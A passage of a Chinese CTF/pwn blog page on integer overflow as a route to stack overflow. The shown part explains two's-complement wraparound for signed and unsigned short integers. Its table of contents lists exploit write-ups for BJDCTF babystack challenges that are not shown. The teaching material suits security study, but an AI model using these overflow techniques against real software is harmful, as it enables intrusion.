@@ -1,0 +1,653 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    特殊的栈溢出-整数溢出 | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="特殊的栈溢出-整数溢出整数溢出介绍  上界溢出（加法溢出add）有符号上界溢出  有符号整数的补码存储规则32767+1&#x3D;-32768—— 计算机中所有有符号整数都用 “补码” 表示，这是溢出后数值回绕的根本原因。 123456789101112131415161718192021222324252627282930313233343536373839404142434445461）先明">
+<meta property="og:type" content="article">
+<meta property="og:title" content="特殊的栈溢出-整数溢出">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="特殊的栈溢出-整数溢出整数溢出介绍  上界溢出（加法溢出add）有符号上界溢出  有符号整数的补码存储规则32767+1&#x3D;-32768—— 计算机中所有有符号整数都用 “补码” 表示，这是溢出后数值回绕的根本原因。 123456789101112131415161718192021222324252627282930313233343536373839404142434445461）先明">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766476440219-b1cb315b-2309-40da-b781-fd9fcad24d41-278901.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766476532914-e00ba314-ea08-4a08-901e-96b2dfd7c42f-883235.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766476705113-1c2df336-e947-4cb2-b34a-92c08ae19fd2-241351.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766479992803-6e910e49-d4ba-4a1b-bca8-38907b83f71c-990612.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766480149096-51ce0c6e-b939-4515-96b7-7c520aeffa5d-236585.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766480666401-8a37492d-85db-4018-8d82-5e7c7a7233f1-214549.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766481071614-61daae3b-5f48-4581-9c23-5b46e692318a-098047.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766485129984-16845713-8518-462e-b02e-a3c835e48643-820499.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766485219605-356e217f-3405-4cef-ab1f-fc9f0279c11d-263777.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766487641882-99c7ea5b-8724-48e2-a9d5-1a383df6aca2-067607.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766487848011-9e45be0a-0354-406d-8146-9ec5ff827240-834642.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766488499948-d7f5ccbe-7e1c-4472-8a32-d6fedd97d740-906556.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766488834844-980cb1f8-b61e-47d7-9a32-a15c6b58abc4-684194.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766488746454-4ebeadac-12b7-4582-8f7a-739fbb2846fd-880995.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766489185552-762dba68-bd76-45ca-b038-45786a5fdfcf-243144.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766481830654-965bf7df-16c9-4f0f-b4a8-f8794b1be6ce-661341.png">
+<meta property="article:published_time" content="2026-04-28T11:14:15.297Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.371Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/1766476440219-b1cb315b-2309-40da-b781-fd9fcad24d41-278901.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="特殊的栈溢出-整数溢出">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">特殊的栈溢出-整数溢出</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">特殊的栈溢出-整数溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">整数溢出介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%95%8C%E6%BA%A2%E5%87%BA%EF%BC%88%E5%8A%A0%E6%B3%95%E6%BA%A2%E5%87%BAadd%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">上界溢出（加法溢出add）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%89%E7%AC%A6%E5%8F%B7%E4%B8%8A%E7%95%8C%E6%BA%A2%E5%87%BA"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">有符号上界溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%89%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0%E7%9A%84%E8%A1%A5%E7%A0%81%E5%AD%98%E5%82%A8%E8%A7%84%E5%88%9932767-1-32768"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text">有符号整数的补码存储规则32767+1&#x3D;-32768</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text">一句话总结</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E7%AC%A6%E5%8F%B7%E4%B8%8A%E7%95%8C%E6%BA%A2%E5%87%BA"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">无符号上界溢出</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E7%95%8C%E6%BA%A2%E5%87%BA%EF%BC%88%E5%87%8F%E6%B3%95%E6%BA%A2%E5%87%BAsub%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">下界溢出（减法溢出sub）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">整数溢出的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#read-0-buf-data-len"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">read(0,buf,data_len)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-number">1.2.</span> <span class="toc-text">例题&#x2F;&#x2F;整数溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%89-BJDCTF-2020-babystack"><span class="toc-number">1.2.1.</span> <span class="toc-text">1）[BJDCTF 2020]babystack</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.2.1.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#setvbuf-stdout-0-2-0"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">setvbuf(stdout, 0, 2, 0)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#LODWORD-nbytes-0-%EF%BC%88HIDWORD%E6%98%AF%E9%AB%98%E4%B8%89%E5%8D%81%E4%BA%8C%E4%BD%8D%EF%BC%89"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">LODWORD(nbytes) &#x3D; 0; （HIDWORD是高三十二位）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp-1%EF%BC%89"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">exp 1）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%89-BJDCTF-2020-babystack2-0"><span class="toc-number">1.2.2.</span> <span class="toc-text">2）[BJDCTF 2020]babystack2.0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exp-2%EF%BC%89"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">exp 2）</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-特殊的栈溢出-整数溢出" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T11:14:15.297Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="特殊的栈溢出-整数溢出"><a href="#特殊的栈溢出-整数溢出" class="headerlink" title="特殊的栈溢出-整数溢出"></a>特殊的栈溢出-整数溢出</h1><h3 id="整数溢出介绍"><a href="#整数溢出介绍" class="headerlink" title="整数溢出介绍"></a>整数溢出介绍</h3><img src="/HFTTC.github.io/images/pwn/1766476440219-b1cb315b-2309-40da-b781-fd9fcad24d41-278901.png" alt="1766476440219-b1cb315b-2309-40da-b781-fd9fcad24d41.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<h4 id="上界溢出（加法溢出add）"><a href="#上界溢出（加法溢出add）" class="headerlink" title="上界溢出（加法溢出add）"></a>上界溢出（加法溢出add）</h4><h5 id="有符号上界溢出"><a href="#有符号上界溢出" class="headerlink" title="有符号上界溢出"></a>有符号上界溢出</h5><img src="/HFTTC.github.io/images/pwn/1766476532914-e00ba314-ea08-4a08-901e-96b2dfd7c42f-883235.png" alt="1766476532914-e00ba314-ea08-4a08-901e-96b2dfd7c42f.png" style="max-width: 100%; display: block; margin: 0 auto;">
+
+<h6 id="有符号整数的补码存储规则32767-1-32768"><a href="#有符号整数的补码存储规则32767-1-32768" class="headerlink" title="有符号整数的补码存储规则32767+1&#x3D;-32768"></a><font style="color:rgb(0, 0, 0) !important;">有符号整数的补码存储规则32767+1&#x3D;-32768</font></h6><p><font style="color:rgba(0, 0, 0, 0.85);">—— 计算机中所有有符号整数都用 “补码” 表示，这是溢出后数值回绕的根本原因。</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）先明确 short <span class="built_in">int</span> 的基础属性</span><br><span class="line">存储长度：<span class="number">2</span> 字节 = <span class="number">16</span> 位二进制（bit），只能存储 <span class="number">16</span> 位的 <span class="number">0</span>/<span class="number">1</span> 组合；</span><br><span class="line">有符号规则：最高位左边第一位是 “符号位”：</span><br><span class="line">符号位 = <span class="number">0</span> → 正数；</span><br><span class="line">符号位 = <span class="number">1</span> → 负数；</span><br><span class="line">取值范围推导：</span><br><span class="line">正数：符号位 <span class="number">0</span>，剩下 <span class="number">15</span> 位表示数值（<span class="number">0</span>~<span class="number">2</span>¹⁵-<span class="number">1</span>）→ <span class="number">0</span>~<span class="number">32767</span></span><br><span class="line">（对应十六进制 <span class="number">0x0000</span>~<span class="number">0x7FFF</span>）；</span><br><span class="line">负数：符号位 <span class="number">1</span>，剩下 <span class="number">15</span> 位通过 “补码规则” 表示数值 → 最小是-<span class="number">32768</span></span><br><span class="line">（对应十六进制 <span class="number">0x8000</span>），最大是-<span class="number">1</span>（对应十六进制 <span class="number">0xFFFF</span>）。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>）补码规则到底是什么？</span><br><span class="line">补码的设计目的是：</span><br><span class="line">让计算机用 “加法” 统一实现 “加减法”（不用单独设计减法电路），规则分两种情况：</span><br><span class="line">正数的补码：就是它本身的二进制（原码 = 补码）；</span><br><span class="line">例：<span class="number">32767</span>（十进制）→ 二进制0111 <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span>（符号位 <span class="number">0</span>，后 <span class="number">15</span> 位全 <span class="number">1</span>）</span><br><span class="line">                  → 十六进制 <span class="number">0x7FFF</span>；</span><br><span class="line">负数的补码：等于 “其绝对值的二进制（原码）按位取反 + <span class="number">1</span>”（简称 “取反加 <span class="number">1</span>”）；</span><br><span class="line">例：-<span class="number">1</span>（十进制）→ 绝对值 <span class="number">1</span> 的二进制<span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> 0001 </span><br><span class="line">               → 按位取反<span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1110</span> </span><br><span class="line">               → +<span class="number">1</span> 后<span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span>（十六进制 <span class="number">0xFFFF</span>）。</span><br><span class="line"><span class="number">3</span>）为什么 <span class="number">0x8000</span> 是 - <span class="number">32768</span>？（关键推导）</span><br><span class="line"><span class="number">0x8000</span> 是十六进制，先转成 <span class="number">16</span> 位二进制:<span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span>（符号位 <span class="number">1</span>，后 <span class="number">15</span> 位全 <span class="number">0</span>）。</span><br><span class="line">按补码规则反向推导（已知补码求原数，即负数的绝对值）：</span><br><span class="line">补码 → 先减 <span class="number">1</span>（逆操作 “加 <span class="number">1</span>”）：<span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span>-<span class="number">1</span>=0111 <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span>；</span><br><span class="line">再按位取反（逆操作 “取反”）:0111 <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span>取反后是<span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span>？</span><br><span class="line"></span><br><span class="line"><span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span>是 <span class="number">16</span> 位有符号数的 “特殊边界”：</span><br><span class="line">后 <span class="number">15</span> 位全 <span class="number">0</span>，按补码规则，它对应的绝对值是 “<span class="number">2</span>¹⁵ = <span class="number">32768</span>”；</span><br><span class="line">符号位是 <span class="number">1</span>（负数），因此最终表示 “-<span class="number">32768</span>”。</span><br><span class="line">补充：为什么它特殊？因为 <span class="number">32768</span> 的二进制是<span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span>（<span class="number">17</span> 位），</span><br><span class="line">但 short <span class="built_in">int</span> 只有 <span class="number">16</span> 位，无法存储 <span class="number">17</span> 位的 “正数 <span class="number">32768</span>”，</span><br><span class="line">所以这个 <span class="number">16</span> 位二进制组合<span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span>，</span><br><span class="line">只能按补码规则解读为 “-<span class="number">32768</span>”（有符号数的最小边界）。</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>）<span class="number">32767</span>+<span class="number">1</span> 为什么会变成 - <span class="number">32768</span>？（数值回绕过程）</span><br><span class="line">结合前面的规则，一步步看运算的底层逻辑：</span><br><span class="line"><span class="number">32767</span> 的二进制：0111 <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span>（<span class="number">0x7FFF</span>，有符号正数的最大值）；</span><br><span class="line">执行 + <span class="number">1</span> 运算：0111 <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> + <span class="number">1</span> = <span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line">（二进制加法，逢 <span class="number">2</span> 进 <span class="number">1</span>，最后一位 <span class="number">1</span>+<span class="number">1</span>=<span class="number">0</span> 进 <span class="number">1</span>，</span><br><span class="line">一直进位到符号位，把符号位从 <span class="number">0</span> 变成 <span class="number">1</span>）；</span><br><span class="line">结果的二进制是<span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span>（<span class="number">0x8000</span>）；</span><br><span class="line">按有符号 short <span class="built_in">int</span> 的补码规则解读这个结果：符号位 <span class="number">1</span>（负数），对应数值 - <span class="number">32768</span>；</span><br><span class="line">关键：short <span class="built_in">int</span> 只有 <span class="number">16</span> 位，无法存储 “<span class="number">32768</span>”（需要 <span class="number">17</span> 位），</span><br><span class="line">所以运算结果超出 <span class="number">16</span> 位的部分被 “截断”，只保留低 <span class="number">16</span> 位，</span><br><span class="line">最终呈现 “最大值 + <span class="number">1</span> = 最小值” 的数值回绕（也叫 “溢出回绕”）。</span><br></pre></td></tr></table></figure>
+
+<h6 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a><font style="color:rgb(0, 0, 0);">一句话总结</font></h6><p><font style="color:rgb(0, 0, 0);">有符号 short int 的存储位数（16 位）和补码规则，决定了：</font></p>
+<ul>
+<li><font style="color:rgb(0, 0, 0);">最大正数是 0x7FFF（32767），再 + 1 就会进位到符号位，变成 0x8000；</font></li>
+<li><font style="color:rgb(0, 0, 0);">0x8000 按补码解读是 - 32768（有符号最小数）；</font></li>
+<li><font style="color:rgb(0, 0, 0);">本质是 “存储位数不够导致溢出，补码规则让溢出结果回绕到最小值”。</font></li>
+</ul>
+<p><font style="color:rgb(0, 0, 0);">这也是所有有符号整数溢出的共性逻辑（比如 32 位 int 的 2147483647+1&#x3D;-2147483648，原理完全一致，只是位数从 16 位变成 32 位）。</font></p>
+<h5 id="无符号上界溢出"><a href="#无符号上界溢出" class="headerlink" title="无符号上界溢出"></a>无符号上界溢出<img src="/HFTTC.github.io/images/pwn/1766476705113-1c2df336-e947-4cb2-b34a-92c08ae19fd2-241351.png" alt="1766476705113-1c2df336-e947-4cb2-b34a-92c08ae19fd2.png" style="max-width: 100%; display: block; margin: 0 auto;"></h5><p><font style="color:rgb(0, 0, 0);">1. 无符号</font><code><font style="color:rgb(0, 0, 0);">short int</font></code><font style="color:rgb(0, 0, 0);">的溢出示例</font></p>
+<ul>
+<li><strong><font style="color:rgb(0, 0, 0) !important;">类型属性</font></strong><font style="color:rgb(0, 0, 0);">：</font><code><font style="color:rgb(0, 0, 0);">unsigned short int</font></code><font style="color:rgb(0, 0, 0);">（2 字节）的取值范围是</font><code><font style="color:rgb(0, 0, 0);">0<del>65535</font></code><font style="color:rgb(0, 0, 0);">（十六进制</font><code><font style="color:rgb(0, 0, 0);">0x0000</del>0xffff</font></code><font style="color:rgb(0, 0, 0);">）；</font></li>
+<li><strong><font style="color:rgb(0, 0, 0) !important;">溢出现象</font></strong><font style="color:rgb(0, 0, 0);">：当变量</font><code><font style="color:rgb(0, 0, 0);">b=0xffff</font></code><font style="color:rgb(0, 0, 0);">（即 65535）时，执行</font><code><font style="color:rgb(0, 0, 0);">b = b + 1</font></code><font style="color:rgb(0, 0, 0);">，结果会溢出为</font><code><font style="color:rgb(0, 0, 0);">0x0000</font></code><font style="color:rgb(0, 0, 0);">（即 0）。</font></li>
+</ul>
+<p><font style="color:rgb(0, 0, 0);">2. 底层汇编逻辑的差异</font></p>
+<ul>
+<li><strong><font style="color:rgb(0, 0, 0) !important;">无符号运算的汇编指令</font></strong><font style="color:rgb(0, 0, 0);">：直接对内存中的 2 字节数据操作（</font><code><font style="color:rgb(0, 0, 0);">add word ptr [ebp - 0xa], 1</font></code><font style="color:rgb(0, 0, 0);">），因</font><code><font style="color:rgb(0, 0, 0);">0xffff + 1 = 0x10000</font></code><font style="color:rgb(0, 0, 0);">，而 2 字节仅保留低 16 位，最终结果为</font><code><font style="color:rgb(0, 0, 0);">0x0000</font></code><font style="color:rgb(0, 0, 0);">；</font></li>
